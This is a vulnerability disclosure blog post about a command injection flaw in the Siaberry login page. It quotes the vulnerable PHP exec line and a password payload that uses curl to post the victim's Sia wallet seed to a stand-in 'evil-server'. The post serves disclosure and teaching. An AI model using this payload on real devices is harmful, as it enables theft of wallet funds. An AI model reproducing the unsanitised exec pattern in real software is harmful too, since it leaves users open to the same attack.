## Siaberry's Command Injection Vulnerability
Today, I’d like to share several interesting vulnerabilities I discovered in Siaberry, a hardware device for earning cryptocurrency.

Siaberry runs on Sia, a decentralized marketplace for buying and selling data storage. The device is intended to give consumers a plug ‘n play solution to sell storage on Sia’s network, though the two teams have no formal relationship. As buyers purchase space, Siaberry earns income for its owner in the form of Sia’s utility token, Siacoin.

I run a Sia node on my Synology NAS, but I was drawn to Siaberry’s promise of a user-friendly web UI. I took Siaberry for a test drive, and I was blown away by how many serious issues I discovered within just a few hours.

## Command injection: working exploit
My most exciting finding was a command injection vulnerability on the login page.

In the video below, I demonstrate how an attacker can extract the private key from the victim’s Sia wallet simply by entering a particular password on Siaberry’s login page:

    https://www.youtube.com/watch?v=eVOyDglf4vE

## Understanding the vulnerability
The vulnerability is so obvious that many developers and security experts could tell you exactly what the code looked like by watching the video demo above. I’ll confirm your suspicions.

The problem occurred in ActionPage.php:

```
$user=$_POST['uname'];
$pass=$_POST['psw'];
exec("sudo bin/checker $user $pass", $output, $exitcode);
```

That’s it. That’s the whole vulnerability.

Siaberry took untrusted input directly from an HTTP POST request and immediately executed it in the shell. This was a painfully easy vulnerability to exploit.

## How the exploit works
To exploit this, I created an attack server called evil-server. From that machine, I started netcat to dump all traffic it received on port 5555. For convenience, I used a server on my local network, but the same attack would work with any server address, remote or local.

I then used foo as the username and supplied a password of `badpassword || curl -d "$(siac wallet seeds)" -X POST evil-server:5555`.

When ActionPage.php reached its exec line, it executed the following command:

```
sudo bin/checker foo badpassword || \
  curl -d "$(siac wallet seeds)" -X POST evil-server:5555
```

This caused the shell to execute three different commands. The first was the command that Siaberry meant to execute:

```
sudo bin/checker foo badpassword
```

This returned a non-zero exit code because foo/badpassword was a bad username/password combination. Therefore, the shell proceeded to execute the other side of the ||, starting with the embedded command:

```
siac wallet seeds
```

This launched siac, the Sia command-line interface. Those command-line parameters tell Sia to print its wallet seed to the console. The wallet seed is a 29-word passphrase that represents the wallet’s private key. Anyone who has this passphrase completely controls all funds in the victim’s wallet.

```
curl -d "$(siac wallet seeds)" -X POST evil-server:5555
```

Finally, the curl command made an HTTP POST request to http://evil-server:5555, sending the Sia wallet seed as the payload. The attacker, capturing messages on port 5555, recorded the victim’s wallet seed, giving them the ability to steal all funds in the victim’s wallet.